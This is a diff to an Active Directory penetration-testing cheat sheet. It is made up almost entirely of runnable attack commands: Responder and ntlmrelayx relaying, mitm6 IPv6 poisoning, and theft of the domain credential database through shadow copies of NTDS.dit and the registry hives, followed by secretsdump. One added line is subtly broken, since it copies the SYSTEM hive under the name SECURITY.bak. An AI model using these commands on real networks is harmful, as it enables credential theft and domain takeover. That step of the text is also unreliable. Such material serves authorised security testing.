@@ -71,20 +71,8 @@ Responder + NTLMrelayx
 `vim /usr/share/responder/Responder.conf`
 
 ```bash
-[Responder Core]
-
-; Servers to start
-SQL = On
 SMB = Off     # Turn this off
-Kerberos = On
-FTP = On
-POP = On
-SMTP = On
-IMAP = On
 HTTP = Off    # Turn this off
-HTTPS = On
-DNS = On
-LDAP = On
 ```
 
 2. Then we create a list of targets :
@@ -100,20 +88,20 @@ crackmapexec smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
 3. After we can run Responder + ntlmrelayx
 
 ```bash
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support
+
 # Light
 ./Responder.py -I eth0 
-# Medium
+# Medium (enable wpad, netbios domain and wredir suffix queries)
 ./Responder.py -I eth0 -rdw
-# Full
+# Full (Force WPAD and ProxyAuth)
 ./Responder.py -I eth0 -rdwFP
-
-impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support
 ```
 
 mitm6 + NTLMrelayx
 
 ```bash
-sudo mitm6 -hw <MICHMICH-COMPUTER> -d <domain.fqdn> --ignore-nofqnd
+sudo mitm6 -d <domain.fqdn> --ignore-nofqdn
 impacket-ntlmrelayx -tf relaylistOutputFilename.txt -6 
 
 # If no smb available, try ldap/ldaps/mssql : 
@@ -197,12 +185,14 @@ impacket-secretsdump <domain>/<domain_admin>:'<pass>'@<target> -history -just-dc
 vssadmin create shadow /for=C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\NTDS.dit.bak
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\SYSTEM.bak
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\SECURITY.bak
 
 # 2) use any tool that can retrieve these 2 files 
 smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\NTDS.dit.bak'
 smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SYSTEM.bak'
+smbmap -d <domain> -u <user> -p <pass> -H <target> --download-file 'C:\Windows\SECURITY.bak'
 
 # 3) Locally parse theses files
-impacket-secretsdump -ntds NTDS.dit.bak -system SYSTEM.bak LOCAL
+impacket-secretsdump -ntds NTDS.dit.bak -system SYSTEM.bak -security SECURITY.bak LOCAL
 ```
 
